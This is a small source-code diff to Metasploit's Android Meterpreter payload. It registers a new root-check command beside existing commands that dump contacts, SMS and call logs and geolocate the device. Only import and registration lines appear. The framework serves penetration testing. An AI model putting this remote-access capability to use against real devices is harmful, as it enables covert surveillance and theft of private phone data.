@@ -5,6 +5,7 @@ import java.io.OutputStream;
 
 import android.content.Context;
 
+import com.metasploit.meterpreter.android.check_root_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
 import com.metasploit.meterpreter.android.dump_sms_android;
@@ -91,6 +92,8 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("dump_contacts", dump_contacts_android.class);
         mgr.registerCommand("geolocate", geolocate_android.class);
         mgr.registerCommand("dump_calllog", dump_calllog_android.class);
+        mgr.registerCommand("check_root", check_root_android.class);
+        
         return getCommandManager().getNewCommands();
     }
 }
